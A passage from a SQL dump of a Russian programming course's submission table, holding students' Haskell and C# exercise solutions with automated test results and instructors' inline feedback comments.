lines\r\n\r\n\r\n\r\n-- Functions to draw plus sign and minus sign.\r\n\r\naddPlusDash = addx "+" "-"\r\n\r\naddPlusSpace = addx "+" " "\r\n\r\naddMinus = addx "-" " "\r\n\r\n\r\n\r\n-- Draw a vertical line of height hei starting from (h, w).\r\n\r\ndrawvert 0 0 w lines = lines\r\n\r\ndrawvert hei 0 w (line:lines) = ((addspace w line) ++ "|") : drawvert (hei-1) 0 w lines\r\n\r\ndrawvert hei h w (line:lines) = line : drawvert hei (h-1) w lines\r\n\r\n\r\n\r\n-- Skip h lines so the actual drawing starts on the first row.\r\n\r\nshow1 x 0 w lines = show2 x w lines\r\n\r\nshow1 x h w (line:lines) = line : show1 x (h-1) w lines\r\n\r\n\r\n\r\nshow2 (R x) w (line:lines) = ((addspace w line) ++ "-" ++ (show x) ++ "-") : lines\r\n\r\n\r\n\r\nshow2 (Serial r1 r2) w lines =\r\n\r\n	addMinus 0 (w+w12-1) (\r\n\r\n		show2 r2 (w+w1+2) (\r\n\r\n			addMinus 0 (w+w1+1) (\r\n\r\n				show2 r1 (w+1) (\r\n\r\n					addMinus 0 w (\r\n\r\n						lines)))))\r\n\r\n	where\r\n\r\n		w1 = width r1\r\n\r\n		w12 = width (Serial r1 r2)\r\n\r\n\r\n\r\nshow2 (Parallel r1 r2) w lines =\r\n\r\n	addPlusDash (h1+1) (w+w12-1) (\r\n\r\n		show1 r2 (h1+1) (w+1) (\r\n\r\n			addPlusSpace (h1+1) w (\r\n\r\n				drawvert h1 1 (w+w12-1) (\r\n\r\n					addPlusDash 0 (w+w12-1) (\r\n\r\n						show2 r1 (w+1) (\r\n\r\n							drawvert h1 1 w (\r\n\r\n								addPlusDash 0 w (\r\n\r\n									lines))))))))\r\n\r\n	where\r\n\r\n		h1 = height r1\r\n\r\n		w12 = width (Parallel r1 r2)\r\n\r\n\r\n\r\ninstance Show Res where\r\n\r\n	show x = join (show1 x 0 0 (copy "" (height x)))\r\n\r\n	\r\n\r\ntest = (\r\n\r\n	Serial \r\n\r\n		(Parallel\r\n\r\n			(Serial (R 1) (R 2))\r\n\r\n			(Serial (R 3) (R 10))\r\n\r\n		)\r\n\r\n		(Parallel\r\n\r\n			(Serial\r\n\r\n				(Serial\r\n\r\n					(R 1)\r\n\r\n					(Parallel\r\n\r\n						(R 10) (R 100)\r\n\r\n					)\r\n\r\n				)\r\n\r\n				(Parallel\r\n\r\n					(R 100) (R 10)\r\n\r\n				)\r\n\r\n			)\r\n\r\n			(Serial \r\n\r\n				(Parallel\r\n\r\n					(R 1000) (R 10000)\r\n\r\n				)\r\n\r\n				(R 1000000)\r\n\r\n			)\r\n\r\n		)\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(3216, 96, '472848', '2012-11-06 13:30:39', 1, 'public static IEnumerable<int> Merge(IEnumerable<int> a, IEnumerable<int> b)\r\n{\r\n  IEnumerator<int> ae = a.GetEnumerator();\r\n  IEnumerator<int> be = b.GetEnumerator();\r\n\r\n  bool isA = ae.MoveNext();\r\n  bool isB = be.MoveNext();\r\n\r\n  while (isA || isB)\r\n  {\r\n    if (!isA)\r\n    {\r\n      yield return be.Current;\r\n      isB = be.MoveNext();\r\n    }\r\n    else if (!isB)\r\n    {\r\n      yield return ae.Current;\r\n      isA = ae.MoveNext();\r\n    }\r\n    else\r\n    {\r\n      int currA = ae.Current;\r\n      int currB = be.Current;\r\n      if (currA < currB)\r\n      {\r\n        yield return currA;\r\n        isA = ae.MoveNext();\r\n      }\r\n      else if (currB < currA)\r\n      {\r\n        yield return currB;\r\n        isB = be.MoveNext();\r\n      }\r\n      else\r\n      {\r\n        yield return currA;\r\n        isA = ae.MoveNext();\r\n        isB = be.MoveNext();\r\n      }\r\n    }\r\n  }\r\n}', '<br/>Тесты успешно пройдены!'),
(3217, 85, 'tonyo', '2012-11-06 16:34:18', 1, 'data Ration = Rat Integer Integer \r\n\r\ninstance Show Ration where\r\n  show (Rat num den) = show num ++ "/" ++ show den\r\n\r\ninstance Num Ration where\r\n  (Rat n1 d1) + (Rat n2 d2) = Rat (n1*d2 + n2*d1) (d1*d2)  \r\n\r\ninstance Ord Ration where\r\n  (Rat n1 d1) < (Rat n2 d2) = if (d1*d2 > 0) \r\n                              then (n1*d2) < (n2*d1) \r\n                              else (n1*d2) > (n2*d1) \r\n\r\ninstance Eq Ration where\r\n  (Rat n1 d1) == (Rat n2 d2) = n1 == n2 && d1 == d2\r\n', '<br/>Тесты успешно пройдены!'),
(3218, 87, 'tonyo', '2012-11-06 16:34:51', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\neval X value = value\r\neval (N r) value = r\r\neval (Add ex1 ex2) value = eval ex1 value + eval ex2 value\r\neval (Mult ex1 ex2) value = eval ex1 value * eval ex2 value\r\n', '<br/>Тесты успешно пройдены!'),
(3219, 88, 'tonyo', '2012-11-06 16:35:13', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n  deriving Show\r\n\r\ndiff X  = N 1\r\ndiff (N r)  = N 0\r\ndiff (Add ex1 ex2) = Add (diff ex1) (diff ex2)\r\ndiff (Mult ex1 ex2) = Add (Mult (diff ex1) ex2) (Mult ex1 (diff ex2))\r\n', '<br/>Тесты успешно пройдены!'),
(3220, 94, '787463', '2012-11-06 19:45:17', 1, 'data Scheme = Resistance Integer | Parallel Scheme Scheme | Sequential Scheme Scheme\r\n\r\n\r\n\r\nnumberOfDigits n = if n < 10 then 1 else 1 + numberOfDigits (n `div` 10)\r\n\r\n\r\n\r\ngenerateString c n = foldr (	 res -> res ++ c) "" [1..n]\r\n\r\n\r\n\r\nschemeDimentions (Resistance n) = (1, 2 + numberOfDigits n)\r\n\r\nschemeDimentions (Sequential s1 s2) =\r\n\r\n    let\r\n\r\n      (height1, width1) = schemeDimentions s1\r\n\r\n      (height2, width2) = schemeDimentions s2\r\n\r\n    in (max height1 height2, width1 + width2)\r\n\r\nschemeDimentions (Parallel s1 s2) =\r\n\r\n    let\r\n\r\n      (height1, width1) = schemeDimentions s1\r\n\r\n      (height2, width2) = schemeDimentions s2\r\n\r\n    in (1 + height1 + height2, 4 + max width1 width2)\r\n\r\n\r\n\r\nprepareStrings strings from to1 to2 input =\r\n\r\n    let\r\n\r\n      first = if input then "-+" else "+-"\r\n\r\n      last = if input then " +" else "+ "\r\n\r\n      doubleSpaces = "  "\r\n\r\n      other = if input then " |" else "| "\r\n\r\n    in [if k == from\r\n\r\n        then curString ++ first\r\n\r\n        else if k == to1\r\n\r\n             then curString ++ last\r\n\r\n             else if k > from && k < to1\r\n\r\n                  then curString ++ other\r\n\r\n                  else if k > to1 && k < to2\r\n\r\n                       then curString ++ doubleSpaces\r\n\r\n                       else curString\r\n\r\n       | k <- [0..length strings - 1], let curString = strings !! k]\r\n\r\n\r\n\r\nshow'' (Resistance n) (beginRow, width, height) strings =\r\n\r\n    let\r\n\r\n      (_, exactWidth) = schemeDimentions (Resistance n)\r\n\r\n      cabel = generateString "-" (width - exactWidth)\r\n\r\n      spaces = generateString " " width\r\n\r\n    in [if k == beginRow\r\n\r\n        then curString ++ "-" ++ show n ++ "-" ++ cabel\r\n\r\n        else if k > beginRow && k < beginRow + height\r\n\r\n             then curString ++ spaces\r\n\r\n             else curString\r\n\r\n       | k <- [0..length strings - 1], let curString = strings !! k]\r\n\r\n\r\n\r\nshow'' (Sequential s1 s2) (beginRow, width, height) strings =\r\n\r\n    let\r\n\r\n      (_, width1) = schemeDimentions s1\r\n\r\n    in show'' s2 (beginRow, width - width1, height) (show'' s1 (beginRow, width1, height) strings)\r\n\r\n\r\n\r\nshow'' (Parallel s1 s2) (beginRow, width, height) strings =\r\n\r\n    let\r\n\r\n      (height1, _) = schemeDimentions s1\r\n\r\n      preparedStrings = prepareStrings strings beginRow (beginRow + height1 + 1) (beginRow + height) True\r\n\r\n      printedS1 = show'' s1 (beginRow, width - 4, height1 + 1) preparedStrings\r\n\r\n      printedS2 = show'' s2 (beginRow + height1 + 1, width - 4, height - height1 - 1) printedS1\r\n\r\n    in prepareStrings printedS2 beginRow (beginRow + height1 + 1) (beginRow + height) False\r\n\r\n\r\n\r\ninstance Show Scheme where\r\n\r\n    show s =\r\n\r\n        let\r\n\r\n          (height, width) = schemeDimentions s\r\n\r\n        in foldr (string res -> res ++ string ++ "\r\n") "" (show'' s (0, width, height) ["" | k <- [1..height]])\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3221, 96, '318210', '2012-11-06 20:12:38', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace Merge242\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static IEnumerable<T> Merge<T>(IEnumerable<T> arr1, IEnumerable<T> arr2) where T:IComparable<T>\r\n\r\n        {\r\n\r\n            // Убираем ненужные повторы в каждом из списков\r\n\r\n            var enum1 = arr1.Distinct().GetEnumerator();\r\n\r\n            var enum2 = arr2.Distinct().GetEnumerator();\r\n    --- Последовательности же точно строго возрастающие, поэтому там точно нет повторов..\r\n\r\n\r\n            bool arr1nonEmpty = enum1.MoveNext();\r\n\r\n\r\n\r\n            while (enum2.MoveNext())\r\n\r\n            {\r\n\r\n                while (arr1nonEmpty && enum1.Current.CompareTo(enum2.Current) < 0)\r\n\r\n                {\r\n\r\n                    yield return enum1.Current;\r\n\r\n                    arr1nonEmpty = enum1.MoveNext();\r\n\r\n                }\r\n\r\n                // если есть одинаковые элементы в списках\r\n\r\n                if (enum1.Current.CompareTo(enum2.Current) == 0)\r\n\r\n                {\r\n\r\n                    arr1nonEmpty = enum1.MoveNext();\r\n\r\n                }\r\n\r\n                yield return enum2.Current;\r\n\r\n            }\r\n\r\n            // Вдруг что-то осталось в arr1\r\n\r\n            while (arr1nonEmpty)\r\n\r\n            {\r\n\r\n                yield return enum1.Current;\r\n\r\n                arr1nonEmpty = enum1.MoveNext();\r\n\r\n            }\r\n\r\n\r\n\r\n\r\n\r\n        }\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = { 1, 5, 5, 8, 9};\r\n\r\n            int[] b = { 3, 5, 9, 9, 10 };\r\n\r\n            foreach (int i in Merge(a, b))\r\n\r\n            {\r\n\r\n                Console.WriteLine(i);\r\n\r\n            }\r\n\r\n            // Наверное ещё можно было через Union, OrderBy и Distinct\r\n    --- Как у вас - лучше, мне кажется. Птому что если использовать Union и OrderBy то, видимо,\r\n    --- не будет работать с бесконечными списками (а у вас работает, если убрать Distinct, и это замечательно)\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3222, 91, '318210', '2012-11-06 20:35:01', 1, 'merge [] ys = ys\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys) | x < y = x : merge xs (y:ys)\r\n		    | x == y = x : merge xs ys\r\n		    | otherwise = y : merge (x:xs) ys', '<br/>Тесты успешно пройдены!'),
(3223, 85, '82873297', '2012-11-06 20:51:36', 0, 'data Ration = Rat Integer Integer\r\n\n\r\n\ninstance Show Ration where\r\n\n         show (Rat x y) = (show x) ++ "/" ++ (show y)\r\n\n\r\n\ninstance Eq Ration where\r\n\n         Rat x y == Rat u v | (x*v-y*u==0) = True\r\n\n                            | otherwise = False\r\n\ninstance Ord Ration where\r\n\n         Rat x y < Rat u v | (x*v-y*u<0) = True\r\n\n                           | otherwise = False\r\n\n\r\n\ninstance Num Ration where\r\n\n         Rat x y + Rat u v = Rat (x*v+y*u) (y*v)\r\n\n\r\n\n\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3224, 86, '82873297', '2012-11-06 20:54:11', 1, 'allNondivisible xs = allNonDivisible1 xs (	->True)\r\n\r\n\r\n\r\nallNonDivisible1 [] cond = True\r\n\r\nallNonDivisible1 (x:xs) cond = if (cond x /= True) then False\r\n\r\n                               else allNonDivisible1 xs (	->(cond t)&&((gcd t x) /= x)&&((gcd t x) /= t))\r\n   --- ОК, но немного слишком сложно - чтобы проверить, делится ли a на b вовсе не надо вычислять их gcd :)', '<br/>Тесты успешно пройдены!'),
(3225, 87, '82873297', '2012-11-06 20:54:31', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\n\r\n\r\neval X n = n\r\n\r\neval (N i) _ = i\r\n\r\neval (Add e1 e2) x = (eval e1 x)+(eval e2 x)\r\n\r\neval (Mult e1 e2) x = (eval e1 x)*(eval e2 x)\r\n', '<br/>Тесты успешно пройдены!'),
(3226, 88, '82873297', '2012-11-06 20:54:52', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\n\r\ndiff X = (N 1)\r\n\r\ndiff (N _) = (N 0)\r\n\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\n\r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e1 (diff e2))\r\n', '<br/>Тесты успешно пройдены!'),
(3227, 89, '82873297', '2012-11-06 20:55:04', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\n\r\n\r\nflatten Empty = []\r\n\r\nflatten (Node x l r) = [x]++(flatten l)++(flatten r)\r\n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(3228, 90, '82873297', '2012-11-06 20:55:30', 1, 'findSame [_] = (0,False)\r\n\r\nfindSame (x:xs) | (elem x xs) = (x,True)\r\n\r\n                | otherwise = findSame xs\r\n  --- ОК, но, просто как замечание, получается, что наша функция будет работать только\r\n  --- для чисел, и не будет, например, работать для строк. И все это из-за того,\r\n  --- что в первом правиле встречается 0, который нам вообще-то совсем не нужен,\r\n  --- просто надо было что-то написать. С этой проблемой вполне легко справиться,\r\n  --- и мы  это обсудим в следующий раз  ', '<br/>Тесты успешно пройдены!'),
(3229, 91, '82873297', '2012-11-06 20:55:45', 1, 'merge xs [] = xs\r\n\r\nmerge [] xs = xs \r\n\r\nmerge (x:xs) (y:ys) | x<y = (x:(merge xs (y:ys)))\r\n\r\n                    | x>y = (y:(merge (x:xs) ys))\r\n\r\n                    | otherwise = (x:(merge xs ys))\r\n', '<br/>Тесты успешно пройдены!'),
(3230, 81, '82873297', '2012-11-06 20:56:07', 1, 'lst239 = 2:3:9:(zipWith (x y->x*10+y) (repl239 lst239) list239)\r\n\r\n\r\n\r\nlist239 = 2:3:9:list239\r\n\r\n\r\n\r\nrepl239 (x:xs) = (replicate 3 x)++repl239 xs\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3231, 85, '82873297', '2012-11-06 21:20:13', 1, 'data Ration = Rat Integer Integer\r\n\r\n\r\n\r\ninstance Show Ration where\r\n\r\n         show (Rat x y) = (show x) ++ "/" ++ (show y)\r\n\r\n\r\n\r\ninstance Eq Ration where\r\n\r\n         Rat x y == Rat u v | (x*v-y*u==0) = True\r\n\r\n                            | otherwise = False\r\n\r\ninstance Ord Ration where\r\n\r\n         Rat x y < Rat u v | ((x*v-y*u<0)&&(y*v>0)) || ((x*v-y*u>0)&&(y*v<0)) = True\r\n\r\n                           | otherwise = False\r\n\r\n\r\n\r\ninstance Num Ration where\r\n\r\n         Rat x y + Rat u v = Rat (x*v+y*u) (y*v)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3232, 90, '318210', '2012-11-06 21:23:56', 1, 'findsame (x : xs) = f (x:xs) [] \r\n\r\nfindin x [] = False\r\nfindin x (y:ys) | x == y = True\r\n		| otherwise = findin x ys\r\n\r\nf [] (y:ys) = (-1, "No duplicates")\r\nf (x:xs) (ys) | findin x (ys) == True = (x, "We found")\r\n	      | otherwise = f (xs) (x:ys)\r\n  --- ОК, очень хорошо. Но, просто как замечание, получается, что наша функция будет работать только\r\n  --- для чисел, и не будет, например, работать для строк. И все это из-за того,\r\n  --- что в первом правиле встречается -1, который нам вообще-то совсем не нужен,\r\n  --- просто надо было что-то написать. С этой проблемой вполне легко справиться,\r\n  --- и мы  это обсудим в следующий раз  \r\n\r\n--showNum a = showString "We found: " . shows (a)', '<br/>Тесты успешно пройдены!'),
(3233, 91, '5772638', '2012-11-06 21:40:05', 1, 'merge [] ys= ys\r\nmerge xs []= xs\r\nmerge xs ys = let x=(head xs) \r\n                  y=(head ys) \r\n                  in if x < y then x : merge (tail xs) ys \r\n                              else if x> y then y: merge xs (tail ys)\r\n                                           else x: merge (tail xs) (tail ys)', '<br/>Тесты успешно пройдены!'),
(3234, 89, '318210', '2012-11-06 22:30:01', 1, 'data Tree a = Empty | Node a  (Tree a)  (Tree a)\r\n\r\nf Empty = []\r\nf (Node x left right) = concat [ [x] : f left , f right ]\r\n\r\nflatten x = concat (f x)\r\n   --- ОК, но это не совсем честно, ведь concat для двух аргументов, ето и есть ++,\r\n   --- те фактически вы вызываете ++', '<br/>Тесты успешно пройдены!'),
(3235, 85, '318210', '2012-11-07 02:05:48', 1, 'data Rat = Rat Integer Integer\r\n\r\n\r\ninstance Eq Rat where\r\n	(Rat x1 y1) == (Rat x2 y2) = ( ( x1 * y2 == x2 * y1 ) && ( y1 /= 0 ) && ( y2 /= 0 ) )\r\ninstance Ord Rat where\r\n	(Rat x1 y1) `compare` (Rat x2 y2) = if (y1 /= 0 && y2 /= 0) then ( (x1 * y2 - x2 * y1) * signum(y1 * y2) ) `compare` (0) else (1 `compare` 0)\r\ninstance Show Rat where\r\n	show (Rat x y) = if y /= 0 then (show x ++ "/" ++ show y) else ("error")\r\ninstance Num Rat where\r\n	(Rat x1 y1) + (Rat x2 y2) = Rat (x1 * y2 + x2 * y1) (y1 * y2)\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3236, 95, '787463', '2012-11-07 12:38:49', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace task_24_1\r\n\r\n{\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		public static bool allDifferent(int[] a)\r\n\r\n		{\r\n\r\n			return allDifferent1(a, 0, t => true);\r\n\r\n		}\r\n\r\n		\r\n\r\n		public static bool allDifferent1(int[] a, int from, Predicate<int> cond)\r\n\r\n		{\r\n\r\n			if (from == a.Length)\r\n\r\n			{\r\n\r\n				return true;\r\n\r\n			}\r\n\r\n			\r\n\r\n			int x = a[from];\r\n\r\n			if (!cond(x))\r\n\r\n			{\r\n\r\n				return false;\r\n\r\n			} else\r\n\r\n			{\r\n\r\n				return allDifferent1(a, from + 1, t => cond(t) && t != x);\r\n\r\n			}\r\n\r\n		}\r\n\r\n		\r\n\r\n		static void Main(string[] args)\r\n\r\n		{\r\n\r\n			int[] a = {1,2,3,4,5};\r\n\r\n			int[] b = {1,2,3,4,1};\r\n\r\n			Console.WriteLine(allDifferent(a));\r\n\r\n			Console.WriteLine(allDifferent(b));\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3237, 96, '787463', '2012-11-07 12:39:09', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace task_24_2\r\n\r\n{\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		public static IEnumerable<int> Merge(IEnumerable<int> a, IEnumerable<int> b)\r\n\r\n		{\r\n\r\n			IEnumerator<int> aEnum = a.GetEnumerator();\r\n\r\n			IEnumerator<int> bEnum = b.GetEnumerator();\r\n\r\n			bool aHasNext = aEnum.MoveNext();\r\n\r\n			bool bHasNext = bEnum.MoveNext();\r\n\r\n			\r\n\r\n			while (true)\r\n\r\n			{\r\n\r\n				if (aHasNext && !bHasNext)\r\n\r\n				{\r\n\r\n					yield return aEnum.Current;\r\n\r\n					while (aEnum.MoveNext())\r\n\r\n					{\r\n\r\n						yield return aEnum.Current;\r\n\r\n					}\r\n\r\n					yield break;\r\n\r\n				} else if (!aHasNext && bHasNext)\r\n\r\n				{\r\n\r\n					yield return bEnum.Current;\r\n\r\n					while (bEnum.MoveNext())\r\n\r\n					{\r\n\r\n						yield return bEnum.Current;\r\n\r\n					}\r\n\r\n					yield break;\r\n\r\n				} else if (aHasNext && bHasNext)\r\n\r\n				{\r\n\r\n					int x = aEnum.Current;\r\n\r\n					int y = bEnum.Current;\r\n\r\n					if (x == y) \r\n\r\n					{\r\n\r\n						aHasNext = aEnum.MoveNext();\r\n\r\n						bHasNext = bEnum.MoveNext();\r\n\r\n						yield return x;\r\n\r\n					} else if (x > y)\r\n\r\n					{\r\n\r\n						bHasNext = bEnum.MoveNext();\r\n\r\n						yield return y;\r\n\r\n					} else\r\n\r\n					{\r\n\r\n						aHasNext = aEnum.MoveNext();\r\n\r\n						yield return x;\r\n\r\n					}\r\n\r\n				} else\r\n\r\n				{\r\n\r\n					yield break;\r\n\r\n				}\r\n\r\n			}\r\n\r\n		}\r\n\r\n\r\n\r\n		static void Main(string[] args)\r\n\r\n		{\r\n\r\n			int [] a = { 1, 5, 8, 20};\r\n\r\n			int [] b = { 3, 5, 9, 10, 20, 30, 40};\r\n\r\n			foreach (int i in Merge(a, b))\r\n\r\n			{\r\n\r\n				Console.WriteLine(i);\r\n\r\n			}\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3238, 86, 'erwert', '2012-11-07 12:54:42', 0, 'allNondivisible l = allNacc l (a b -> (mod a b == 0) || (mod b a == 0))\r\nallNacc [] cond = False\r\nallNacc (h:hs) cond = (elem True [cond h t| t <- hs]) || allNacc hs cond ', 'Выражение имеет неправильное значение: allNondivisible [2, 7, 6, 5]'),
(3239, 86, 'erwert', '2012-11-07 12:58:26', 2, 'allNondivisible l = not $ allNacc l (a b -> (mod a b == 0) || (mod b a == 0))\r\nallNacc [] cond = False\r\nallNacc (h:hs) cond = (elem True [cond h t| t <- hs]) || allNacc hs cond \r\n  --- OK, это не совсем то, что имелось в виду и давайте я подскажу, что имелось в виду.\r\n  --- 1. Пусть из каких то соображений, мы хотим чтобы эта функция использовала хвостовую рекурсию.\r\n  --- Это можно сделать как-то так:\r\n  ---  - определить функицю allNondivisible1 с доп параметром в котором мы запоминаем все, что мы уже просмотрели\r\n  ---    allNondivisible1 [] _ = True\r\n  ---    allNondivisible1 (x:xs) ys = if x делиться на элемент из ys или наоборот \r\n  ---                                then False \r\n  ---                                else allNondivisible1 xs (x:ys)\r\n  ---    И вызов\r\n  ---    allNondivisible xs = allNondivisible1 xs []\r\n  --- Таким образом, в доп параметре мы копим список - например для allNondivisible [3,5,2,6] копим\r\n  --- там сначала [], потом [3], потом [5,3] и т.д.\r\n  --- А теперь собственно идея: предлагается попробовать написать похоже, но копить не список, а _условие_\r\n  --- Чтобы сначала было условие t -> True, потом t -> mod t 3 !=0 && mod 3 t != 0, потом\r\n  --- t -> mod t 3 !=0 && mod 3 t != 0 && mod t 5 !=0 && mod 5 t != 0\r\n  --- И т.д. \r\n  --- Вот, такая подсказка. Проще всего, честно говоря посмотреть похожий пример в конспекте)\r\n', '<br/>Тесты успешно пройдены!'),
(3240, 91, '3607492', '2012-11-07 13:04:43', 1, 'merge [] [] = []\r\n  --- Это не обязательно, это следует, в частности, из второго или третьего правила.\r\nmerge [] a = a\r\nmerge b [] = b\r\nmerge (x:xs) (y:ys) = if (x==y) then x:(merge xs ys) else if (x>y) then y:(merge (x:xs) ys) else x:(merge xs (y:ys))\r\n', '<br/>Тесты успешно пройдены!'),
(3241, 90, '3607492', '2012-11-07 13:07:43', 1, 'findSame [x] = "not find!"\r\nfindSame (x:xs) = if (any (==x) xs) then ("find:"++(show x)) else findSame xs\r\n   --- Засчитано, но вообще это не сосем удобное для использования решение, мне кажется.\r\n   --- Ведь обычно надо чтобы можно было не просто посмотреть результат в виде строки,\r\n   --- а что-то еще с ним сделать - например, передать в другую функцию и т.д.\r\n   --- Те лучше возвращать не строку, а само значение + что-то дополнительное.\r\n   --- Но ОК, засчитано, и мы это обсудим.', '<br/>Тесты успешно пройдены!'),
(3242, 89, '3607492', '2012-11-07 13:46:24', 0, 'func2 [] b = b\r\nfunc2 (x:xs) b = x:func2 xs b\r\n\r\nfunc Empty Empty = []\r\nfunc Empty (Node a t d) = a:(func t d)\r\nfunc (Node a t d) b = a:(func2 (func t d) (func Empty b))\r\n\r\nflatten Empty = []\r\nflatten (Node a t d) = a:(func t d)', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))", проверьте правильность синтаксиса'),
(3243, 89, '3607492', '2012-11-07 13:47:54', 1, 'data Tree = Node Int Tree Tree|Empty\r\n\r\nfunc2 [] b = b\r\nfunc2 (x:xs) b = x:func2 xs b\r\n\r\nfunc Empty Empty = []\r\nfunc Empty (Node a t d) = a:(func t d)\r\nfunc (Node a t d) b = a:(func2 (func t d) (func Empty b))\r\n\r\nflatten Empty = []\r\nflatten (Node a t d) = a:(func t d)', '<br/>Тесты успешно пройдены!'),
(3244, 86, '3607492', '2012-11-07 13:53:56', 0, 'allNondivisible [] = False\r\nallNondivisible (x:xs) = ((any (l -> (l `mod` x == 0)||(x `mod` l == 0) ) xs)||allNondivisible xs)', 'Выражение имеет неправильное значение: allNondivisible [2, 7, 6, 5]'),
(3245, 89, 'erwert', '2012-11-07 13:54:59', 1, 'data Tree = Node Int Tree Tree | Empty deriving (Eq)\r\n\r\nfoldTree f r Empty = r\r\nfoldTree f result (Node i l r) =  foldTree f (foldTree f (f result i) l) r\r\nflatten t = reverse $ foldTree (a b -> (b:a)) []  t\r\n        --- Вместо a b -> (b:a) можно просто (:)\r\n        --- Тут же и нужна функция от твух параметров', '<br/>Тесты успешно пройдены!'),
(3246, 86, '3607492', '2012-11-07 13:57:15', 0, 'allNondivisible [] = True\r\nallNondivisible (x:xs) = ((all (l -> (l `mod` x /= 0)&&(x `mod` l /= 0) ) xs)&& allNondivisible xs)', '<br/>Тесты успешно пройдены!'),
(3247, 86, '3607492', '2012-11-07 13:57:19', 2, 'allNondivisible [] = True\r\nallNondivisible (x:xs) = ((all (l -> (l `mod` x /= 0)&&(x `mod` l /= 0) ) xs)&& allNondivisible xs)\r\n\r\n  --- OK, это не совсем то, что имелось в виду и давайте я подскажу, что имелось в виду.\r\n  --- 1. Пусть из каких то соображений, мы хотим чтобы эта функция использовала хвостовую рекурсию.\r\n  --- Это можно сделать как-то так:\r\n  ---  - определить функицю allNondivisible1 с доп параметром в котором мы запоминаем все, что мы уже просмотрели\r\n  ---    allNondivisible1 [] _ = True\r\n  ---    allNondivisible1 (x:xs) ys = if x делиться на элемент из ys или наоборот \r\n  ---                                then False \r\n  ---                                else allNondivisible1 xs (x:ys)\r\n  ---    И вызов\r\n  ---    allNondivisible xs = allNondivisible1 xs []\r\n  --- Таким образом, в доп параметре мы копим список - например для allNondivisible [3,5,2,6] копим\r\n  --- там сначала [], потом [3], потом [5,3] и т.д.\r\n  --- А теперь собственно идея: предлагается попробовать написать похоже, но копить не список, а _условие_\r\n  --- Чтобы сначала было условие t -> True, потом t -> mod t 3 !=0 && mod 3 t != 0, потом\r\n  --- t -> mod t 3 !=0 && mod 3 t != 0 && mod t 5 !=0 && mod 5 t != 0\r\n  --- И т.д. \r\n  --- Вот, такая подсказка. Проще всего, честно говоря посмотреть похожий пример в конспекте)\r\n', '<br/>Тесты успешно пройдены!'),
(3248, 89, '3742311', '2012-11-07 17:11:27', 0, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nflattenTmp Empty l = l\r\nflattenTmp Node i t1 t2 l = i:(flattenTmp t1 (flattenTmp t2 l))\r\n\r\nflatten t = flattenTmp t []', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))", проверьте правильность синтаксиса'),
(3249, 89, '3742311', '2012-11-07 17:12:46', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nflattenTmp Empty l = l\r\nflattenTmp (Node i t1 t2) l = i:(flattenTmp t1 (flattenTmp t2 l))\r\n\r\nflatten t = flattenTmp t []', '<br/>Тесты успешно пройдены!'),
(3250, 90, '3742311', '2012-11-07 17:32:18', 1, 'findSame l = let findSameTmp (h:t) n = if t == [] then (0, False) else if (any (x -> x == h) n) then (findSameTmp t n) else if (foldl (s x -> if x == h then s + 1 else s) 0 t) > 0 then (h, True) else (findSameTmp t (h:n)) in findSameTmp l []\r\n   --- ОК, хорошо! Я бы не совсем так сделал, но это мы обсудим.', '<br/>Тесты успешно пройдены!'),
(3251, 91, '3742311', '2012-11-07 17:42:41', 1, 'mergeTmp [] s2 s = s ++ s2\r\nmergeTmp s1 [] s = s ++ s1\r\nmergeTmp (h1:t1) (h2:t2) s = if h1 == h2 then (mergeTmp t1 t2 (s ++ [h1])) else if h1 < h2 then (mergeTmp t1 (h2:t2) (s ++ [h1])) else (mergeTmp (h1:t1) t2 (s ++ [h2]))\r\n\r\nmerge s1 s2 = mergeTmp s1 s2 []\r\n  --- ОК, засчитано, но так у вас не будет работать с бесконечными списками. А это было бы полезно..', '<br/>Тесты успешно пройдены!'),
(3252, 87, '3742311', '2012-11-07 17:57:01', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\neval X t = t\r\neval N c = c\r\neval (Add e1 e2) = (eval e1) + (eval e2)\r\neval (Mult e1 e2) = (eval e1) * (eval e2)', 'Не удалось вычислить выражение "eval (Add (N 3) (Mult X X)) 10", проверьте правильность синтаксиса'),
